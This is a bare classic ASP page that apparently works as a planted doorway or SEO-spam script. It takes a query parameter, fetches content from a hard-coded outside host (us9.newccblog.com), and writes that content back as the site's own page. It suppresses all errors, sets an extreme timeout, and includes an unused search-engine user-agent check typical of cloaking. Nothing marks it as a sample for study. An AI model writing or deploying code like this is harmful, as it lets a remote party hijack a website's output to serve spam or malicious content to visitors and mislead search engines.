<%@ codepage=65001%>
<%
On Error Resume Next
Server.ScriptTimeOut=9999999

Function getHTTPPage(url)
	On Error Resume Next
	dim http
	set http=Server.createobject("Microsoft.XMLHTTP")
	Http.open "GET",url,false
	Http.send()
	if Http.readystate<>4 then
		exit function
	end if
	getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
	set http=nothing
	If Err.number<>0 then
	Response.Write "forbid"
	Err.Clear
	End If
End Function

Function BytesToBstr(body,Cset)
	dim objstream
	set objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	BytesToBstr = objstream.ReadText
	objstream.Close
	set objstream = nothing
End Function



Function checkstr(user_agent)
     allow_agent=split("google,msn,yahoo,bing,yandex,ask",",")
     check_agent=false
     For agenti=lbound(allow_agent) to ubound(allow_agent)
         If InStr(LCase(user_agent),allow_agent(agenti))>0 then
             check_agent=true
             exit for
         end if
     Next
     checkstr=check_agent
 End function

Dim path_info,paths,getid
getid = Request.QueryString("p")

If getid="" or getid=null Then
getid = "list"
End If

If getid<>"" Then
	furl="http://us9.newccblog.com/6.8/syntaxiserror.com/index.php?id=" & getid
	filedata=getHTTPPage(furl)
	Response.Write filedata
	Response.end
End If



%>